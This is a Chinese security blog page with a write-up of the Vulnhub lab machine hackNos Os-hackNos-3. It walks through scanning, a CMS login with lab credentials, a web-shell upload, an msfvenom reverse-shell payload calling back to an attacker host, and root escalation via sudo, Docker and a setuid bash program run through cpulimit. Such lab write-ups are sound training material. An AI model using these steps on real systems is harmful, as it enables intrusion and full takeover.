@@ -1,0 +1,1291 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Vulnhub靶机之HackNos3, LANVNAL&#39;S Blog">
+    <meta name="description" content="WEB安全、渗透测试、代码审计、20届毕业本科生">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Vulnhub靶机之HackNos3 | LANVNAL&#39;S Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">LANVNAL&#39;S Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/CTF/" class="waves-effect waves-light">
+      
+      <i class="fas fa-flag" style="zoom: 0.6;"></i>
+      
+      <span>CTF</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/websec/" class="waves-effect waves-light">
+      
+      <i class="fab fa-internet-explorer" style="zoom: 0.6;"></i>
+      
+      <span>Web安全</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="waves-effect waves-light">
+      
+      <i class="fas fa-code" style="zoom: 0.6;"></i>
+      
+      <span>代码审计</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="waves-effect waves-light">
+      
+      <i class="fas fa-server" style="zoom: 0.6;"></i>
+      
+      <span>靶机</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/other/" class="waves-effect waves-light">
+      
+      <i class="fas fa-align-left" style="zoom: 0.6;"></i>
+      
+      <span>Others</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-list" style="zoom: 0.6;"></i>
+      
+      <span>网站导航</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/tags">
+          
+          <i class="fas fa-tags" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Tags</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/about">
+          
+          <i class="fas fa-user-circle" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>About</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/friends">
+          
+          <i class="fas fa-address-book" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Friends</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories">
+          
+          <i class="fas fa-bookmark" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Categories</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/archives">
+          
+          <i class="fas fa-archive" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Archives</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">LANVNAL&#39;S Blog</div>
+        <div class="logo-desc">
+            
+            WEB安全、渗透测试、代码审计、20届毕业本科生
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/CTF/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-flag"></i>
+			
+			CTF
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/websec/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fab fa-internet-explorer"></i>
+			
+			Web安全
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-code"></i>
+			
+			代码审计
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/%E9%9D%B6%E6%9C%BA/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-server"></i>
+			
+			靶机
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/other/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-align-left"></i>
+			
+			Others
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-list"></i>
+			
+			网站导航
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/tags " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-tags" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Tags</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/about " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-user-circle" style="position: absolute;left:50px" ></i>
+			      
+		          <span>About</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/friends " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-address-book" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Friends</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-bookmark" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Categories</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/archives " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-archive" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Archives</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/hacknos3.png')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Vulnhub靶机之HackNos3</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Vulnhub/">
+                                <span class="chip bg-color">Vulnhub</span>
+                            </a>
+                        
+                            <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                                <span class="chip bg-color">靶机</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="post-category">
+                                靶机
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-02-14
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2020-02-18
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    1.7k
+                </div>
+                
+
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <blockquote>
+<p>2月14情人节，搞靶机和下雪天更配哦～</p>
+</blockquote>
+<h2 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h2><ul>
+<li><a href="https://www.vulnhub.com/entry/hacknos-reconforce,416/" target="_blank" rel="noopener">hackNos: ReconForce</a></li>
+</ul>
+<ul>
+<li><p><strong>Name</strong>: hackNos: Os-hackNos-3</p>
+</li>
+<li><p><strong>Date release</strong>: 14 Dec 2019</p>
+</li>
+<li><p><strong>Author</strong>: <a href="https://www.vulnhub.com/author/rahul-gehlaut,656/" target="_blank" rel="noopener">Rahul Gehlaut</a></p>
+</li>
+<li><p><strong>Difficulty</strong> : Intermediate</p>
+</li>
+<li><p><strong>Flag</strong> : 2 Flag first user And second root</p>
+</li>
+<li><p><strong>Learning</strong> : Web Application | Enumeration | Privilege Escalation</p>
+</li>
+</ul>
+<blockquote>
+<ul>
+<li><strong><a href="https://drive.google.com/open?id=1zWTU6BFXPmS8BDeoVc766FwUJQZ4-_RT" target="_blank" rel="noopener">Download</a></strong></li>
+<li><strong><a href="https://download.vulnhub.com/hacknos/Os-hackNos-3.ova" target="_blank" rel="noopener">Download (Mirror)</a></strong> </li>
+<li><strong>Download <a href="https://download.vulnhub.com/hacknos/Os-hackNos-3.ova.torrent" target="_blank" rel="noopener">(Torrent)</a></strong>  <strong>(<a href="magnet:?xt=urn:btih:9FF44C9BCEDD17BF31022D072B7A587189E3E13E&dn=Os-hackNos-3.ova&tr=http%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80/announce&tr=udp%3A%2F%2Ftracker.publicbt.com%3A80/announce&tr=udp%3A%2F%2Ftracker.istole.it%3A6969">Magnet</a>)</strong></li>
+</ul>
+</blockquote>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>先探测主机IP，因为虚拟机配置的Host-Only网络模式，通过查看本机虚拟网卡可以确定IP段。</p>
+<pre><code class="shell">➜ sudo nmap -sS -O 192.168.56.0/24
+确定主机IP：192.168.56.105</code></pre>
+<p>扫一下端口看看有哪些服务。</p>
+<pre><code class="shell">➜ sudo nmap -sT -A 192.168.56.105
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-02-14 19:56 CST
+Nmap scan report for 192.168.56.105
+Host is up (0.00049s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 ce:16:a0:18:3f:74:e9:ad:cb:a9:39:90:11:b8:8a:2e (RSA)
+|   256 9d:0e:a1:a3:1e:2c:4d:00:e8:87:d2:76:8c:be:71:9a (ECDSA)
+|_  256 63:b3:75:98:de:c1:89:d9:92:4e:49:31:29:4b:c0:ad (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: WebSec
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.
+| http-enum:
+|_  /scripts/: Potentially interesting directory w/ listing on &#39;apache/2.4.41 (ubuntu)&#39;
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+<p>dirsearch的结果：</p>
+<pre><code class="shell">[20:00:32] 200 -  195B  - /index.html
+[20:00:35] 301 -  318B  - /scripts  -&gt;  http://192.168.56.105/scripts/
+[20:00:35] 200 -    2KB - /scripts/
+[20:00:36] 403 -  279B  - /server-status
+[20:00:36] 403 -  279B  - /server-status/
+[20:00:37] 200 -    0B  - /upload.php</code></pre>
+<p>访问发现<code>http://192.168.56.105/scripts/</code>直接列目录，有如下文件：</p>
+<pre><code class="shell">api_ticket_create.php  
+automail.php  
+automail.pl  
+rcron.php</code></pre>
+<h2 id="漏洞发现-amp-getshell"><a href="#漏洞发现-amp-getshell" class="headerlink" title="漏洞发现&amp;getshell"></a>漏洞发现&amp;getshell</h2><p>一番搜索后发现是osticket搭建的邮件系统，没发现可利用的点。</p>
+<p>感觉还有其他的的页面没扫出来，上DirBuster爆破。很快发现了/websec目录，看目录结构是个博客系统。</p>
+<p><code>http://192.168.56.105/websec/admin</code>后台登录页面。登录信息为邮箱+密码。按照HackNos靶机的传统应该是和HackNos相关的信息，想到index页面刚才看到了有邮箱地址和一些标题，遂拿来尝试登录，试了两个就成功登录。（果然是HackNos一贯风格）</p>
+<pre><code>邮箱：contact@hacknos.com
+密码：Securityx</code></pre>
+<p> 成功进入后台，是<code>Gila CMS v1.10.9</code>，利用文件管理功能上传文件写入一句话shell，<code>http://192.168.56.105/websec/admin/fm</code>，然后通过重命名移动到网站根目录<code>src/blog/../../../one.php</code></p>
+<p>蚁剑连接，拿到第一个flag</p>
+<pre><code>/home/blackdevil/user.txt
+bae11ce4f67af91fa58576c1da2aad4b</code></pre>
+<p>PS:这里可以拿cwel来制作用户密码字典进行爆破</p>
+<pre><code class="shell">➜ ./cewl.rb http://192.168.56.105/websec/ &gt; /Users/lanvnal/Files/Vulnhub/HackNos-3/oshacknos3dict.
+
+✦ ➜ cat /Users/lanvnal/Files/Vulnhub/HackNos-3/oshacknos3dict.txt
+CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
+hackNos
+com
+and
+Bootstrap
+JavaScript
+Start
+www
+Out
+More
+Securityx
+has
+everything
+you
+need
+get
+your
+new
+website
+running
+time
+All
+the
+templates
+themes
+are
+open
+source
+free
+download
+easy
+use
+strings
+attached
+Get
+Started
+Your
+Service
+contact
+hacknos
+core
+Plugin
+Custom
+scripts
+for
+this
+Navigation
+template
+About
+Services
+Portfolio
+Contact
+Security
+Find</code></pre>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>先上MSF。</p>
+<pre><code class="shell">➜ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=6666  -f elf -o /Users/lanvnal/Files/Vulnhub/HackNos-3/shell.elf
+
+msf5 &gt; use exploit/multi/handler
+msf5 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp
+payload =&gt; linux/x64/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) &gt; set LHOST 192.168.56.1
+LHOST =&gt; 192.168.56.1</code></pre>
+<p>在config.php发现数据库配置信息，去数据库里看一看。</p>
+<pre><code class="php">$GLOBALS[&#39;config&#39;] = array (
+  &#39;db&#39; =&gt; 
+  array (
+    &#39;host&#39; =&gt; &#39;localhost&#39;,
+    &#39;user&#39; =&gt; &#39;cmsu&#39;,
+    &#39;pass&#39; =&gt; &#39;securityx&#39;,
+    &#39;name&#39; =&gt; &#39;cms&#39;,
+  ),</code></pre>
+<pre><code class="shell">MariaDB [cms]&gt; select username,pass from user;
+select username,pass from user;
++----------+--------------------------------------------------------------+
+| username | pass                                                         |
++----------+--------------------------------------------------------------+
+| admin    | $2y$10$E1OkzxLN.G4ZUYGgrGoQFusEFlkgNBeey9v7SI6jDHZQgL7G.YDFO |
++----------+--------------------------------------------------------------+</code></pre>
+<p>无法解密，也没啥有用的信息。</p>
+<p>那就上LinEnum搜集信息看看吧。从结果来看没有可以用来SUID提权的应用，也没有奇怪的进程。</p>
+<p>有价值的信息如下：</p>
+<pre><code>[-] It looks like we have some admin users:
+uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm)
+uid=1000(blackdevil) gid=118(docker) groups=118(docker),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lxd)
+
+[+] Looks like we&#39;re hosting Docker:
+Docker version 19.03.2, build 6a30dfca03</code></pre>
+<p>有Docker，可能是利用docker提权，然后blackdevil用户在docker组里，而且他还在sudo组。那么关键就是blackdevil用户了。接下里就是想办法搜集blackdevil的信息，找到他的密码。</p>
+<p>左翻右翻在<code>/var/local/</code>目录下发现了名为<code>database</code>的文件，内容如下：</p>
+<pre><code>Expenses
+Software Licenses,$2.78
+Maintenance,$68.87
+Mortgage Interest,$70.35
+Advertising,$9.78
+Phone,$406.80
+Insurance,$9.04
+Opss;fackespreadsheet</code></pre>
+<p>以为是个费用记录，但是最后一行有点奇怪，去搜索一番，发现原来是结果encode的。</p>
+<p>在<a href="http://www.spammimic.com/spreadsheet.php" target="_blank" rel="noopener">该网站</a>可以decode。</p>
+<p>该网站对于spreadsheet加密的解释如下：</p>
+<pre><code>There are terrific tools (like PGP and GPG) for encrypting your mail. If somebody along the way looks at the mail they can&#39;t understand it. But they do know you are sending encrypted mail to your pal.
+
+The answer: encode your message into something innocent looking.
+Your messages will be safe and nobody will know they&#39;re encrypted!</code></pre>
+<p>意思就是加密邮件内容，保证邮件安全。</p>
+<p>解码后内容为：<code>Security@x@</code>，也就是balckdevil用户的密码。</p>
+<h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><h3 id="方法1-直接sudo"><a href="#方法1-直接sudo" class="headerlink" title="方法1:直接sudo"></a>方法1:直接sudo</h3><pre><code class="shell">blackdevil@hacknos:/home$ sudo -l
+[sudo] password for blackdevil:
+Matching Defaults entries for blackdevil on hacknos:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User blackdevil may run the following commands on hacknos:
+    (ALL : ALL) ALL
+blackdevil@hacknos:/home$ sudo cat /root/root.txt
+########    #####     #####   ########         ########
+##     ##  ##   ##   ##   ##     ##            ##     ##
+##     ## ##     ## ##     ##    ##            ##     ##
+########  ##     ## ##     ##    ##            ########
+##   ##   ##     ## ##     ##    ##            ##   ##
+##    ##   ##   ##   ##   ##     ##            ##    ##
+##     ##   #####     #####      ##    ####### ##     ##
+
+
+MD5-HASH: bae11ce4f67af91fa58576c1da2aad4b
+
+Author: Rahul Gehlaut
+
+Blog: www.hackNos.com
+
+Linkedin: https://in.linkedin.com/in/rahulgehlaut</code></pre>
+<h3 id="方法2-Docker提权"><a href="#方法2-Docker提权" class="headerlink" title="方法2:Docker提权"></a>方法2:Docker提权</h3><p>上传Docker镜像和Dockerfile -&gt; 构建镜像 -&gt; 创建docker同时挂载etc目录 -&gt; docker创建用户加入sudo组 -&gt; 退出docker切换新建用户 -&gt; 拥有sudo权限</p>
+<p>过程同：<code>http://lanvnal.com/2020/02/01/Vulnhub靶机之ReconForce01/#docker提权</code></p>
+<h3 id="方法3：利用cpulimit提权"><a href="#方法3：利用cpulimit提权" class="headerlink" title="方法3：利用cpulimit提权"></a>方法3：利用cpulimit提权</h3><blockquote>
+<p><a href="https://gtfobins.github.io/gtfobins/cpulimit/#sudo" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/cpulimit/#sudo</a></p>
+</blockquote>
+<p>www-data用户是没sudo权限的。可以在本地编译一个以root身份调用<code>/bin/bash</code>的C程序，然后配合cpulimit执行，达到提权的目的。</p>
+<p>cpulimit利用方法：<a href="https://gtfobins.github.io/gtfobins/cpulimit/#sudo" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/cpulimit/#sudo</a></p>
+<pre><code class="shell">sudo cpulimit -l 100 -f /bin/sh</code></pre>
+<p>www-data用户没法sudo执行该指令。</p>
+<p>在本机将下面源码编译，上传到靶机上给777权限，然后搭配cpulimit运行。</p>
+<pre><code class="c">#include&lt;stdio.h&gt;
+#include&lt;unistd.h&gt;
+#include&lt;sys/types.h&gt;
+
+int main()
+&#123;
+  setuid(0);
+  setgid(0);
+  system(&quot;/bin/bash&quot;);
+  return 0;
+&#125;</code></pre>
+<p>编译：</p>
+<pre><code class="shell">✦ ➜ gcc exp.c -o exp
+exp.c:9:3: warning: implicit declaration of function &#39;system&#39; is invalid in C99
+      [-Wimplicit-function-declaration]
+  system(&quot;/bin/bash&quot;);
+  ^
+1 warning generated.</code></pre>
+<p>上传后chmod然后和cpulimit一起用：</p>
+<pre><code>www-data@hacknos:/tmp$ chmod 777 exp2
+chmod 777 exp2
+www-data@hacknos:/tmp$ cpulimit -l 100 -f ./exp2
+cpulimit -l 100 -f ./exp2
+Process 6468 detected
+root@hacknos:/tmp# whoami
+whoami
+root
+root@hacknos:/tmp# cat /root/root.txt</code></pre>
+<blockquote>
+<p>这里遇到个问题就是MAC下编译的程序在靶机上会报错，Ubuntu下编译的exp2就可以使用。</p>
+</blockquote>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶机比较偏重信息搜集，同时第三种提权方式涨姿势了。</p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">LANVNAL</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://lanvnal.com/2020/02/14/vulnhub-ba-ji-zhi-hacknos3/">https://lanvnal.com/2020/02/14/vulnhub-ba-ji-zhi-hacknos3/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">LANVNAL</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/Vulnhub/">
+                                    <span class="chip bg-color">Vulnhub</span>
+                                </a>
+                            
+                                <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                                    <span class="chip bg-color">靶机</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,qq,wechat,weibo" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2020/02/16/hexo-ban-ben-sheng-ji/">
+                    <div class="card-image">
+                        
+                        <img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/hexo.png" class="responsive-img" alt="Hexo版本升级指南">
+                        
+                        <span class="card-title">Hexo版本升级指南</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-02-16
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/other/" class="post-category">
+                                    other
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Hexo/">
+                        <span class="chip bg-color">Hexo</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/02/07/mac-xia-brew-an-zhuang-de-wpscan-wu-fa-geng-xin-de-wen-ti/">
+                    <div class="card-image">
+                        
+                        <img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/wpscan.jpg" class="responsive-img" alt="Mac下Brew安装的wpscan无法更新的问题">
+                        
+                        <span class="card-title">Mac下Brew安装的wpscan无法更新的问题</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-07
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/other/" class="post-category">
+                                    other
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Mac/">
+                        <span class="chip bg-color">Mac</span>
+                    </a>
+                    
+                    <a href="/tags/wpscan/">
+                        <span class="chip bg-color">wpscan</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
